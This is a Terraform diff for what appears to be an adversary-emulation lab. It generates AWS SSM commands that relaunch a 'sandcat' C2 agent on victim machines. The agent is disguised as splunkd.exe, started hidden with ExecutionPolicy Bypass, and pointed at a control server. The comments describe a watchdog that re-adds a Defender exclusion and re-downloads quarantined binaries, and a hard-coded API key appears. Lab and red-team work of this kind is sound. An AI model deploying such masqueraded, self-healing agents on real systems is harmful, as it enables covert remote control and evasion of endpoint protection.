@@ -36,13 +36,16 @@ output "check_agents" {
   value = "aws ssm send-command --instance-ids ${aws_instance.server.id} --region ${var.region} --document-name AWS-RunShellScript --parameters 'commands=[\"curl -s -H \\\"KEY: ADMIN123\\\" http://localhost:8888/api/v2/agents\"]'"
 }
 
-# Re-launch the sandcat agent on every victim. Normally unnecessary -- the victim
-# auto-starts it on boot via the "sandcat" scheduled task -- but use this if an
-# agent shows "dead" after a Learner Lab resume, or for victims built before the
-# scheduled task existed. Targets the server's PRIVATE IP (stable across stop/start)
-# and skips victims where it is already running. Run:  terraform output -raw restart_agent | bash
+# Kick the sandcat agent on every victim. Normally unnecessary -- the victim runs a
+# self-healing "sandcat" task (AtStartup + every 5 min) that re-asserts the Defender
+# exclusion, re-downloads the binary if it was quarantined, and relaunches it -- but
+# use this to recover immediately instead of waiting for the next 5-min tick, e.g.
+# right after a Learner Lab resume. It invokes that watchdog script (so it also heals
+# a quarantined/deleted binary via re-download); on victims built before the watchdog
+# existed it falls back to a plain relaunch. Targets the server's PRIVATE IP (stable
+# across stop/start). Run:  terraform output -raw restart_agent | bash
 output "restart_agent" {
-  value = "aws ssm send-command --region ${var.region} --document-name AWS-RunPowerShellScript --instance-ids ${join(" ", aws_instance.victim[*].id)} --parameters 'commands=[\"if (-not (Get-Process splunkd -ErrorAction SilentlyContinue)) { Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList \\\"-server http://${aws_instance.server.private_ip}:8888 -group ${var.agent_group}\\\" -WindowStyle hidden }\"]'"
+  value = "aws ssm send-command --region ${var.region} --document-name AWS-RunPowerShellScript --instance-ids ${join(" ", aws_instance.victim[*].id)} --parameters 'commands=[\"if (Test-Path C:\\\\Users\\\\Public\\\\start-sandcat.ps1) { powershell -NoProfile -ExecutionPolicy Bypass -File C:\\\\Users\\\\Public\\\\start-sandcat.ps1 } else { if (-not (Get-Process splunkd -ErrorAction SilentlyContinue)) { Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList \\\"-server http://${aws_instance.server.private_ip}:8888 -group ${var.agent_group}\\\" -WindowStyle hidden } }\"]'"
 }
 
 output "ui_login_hint" {
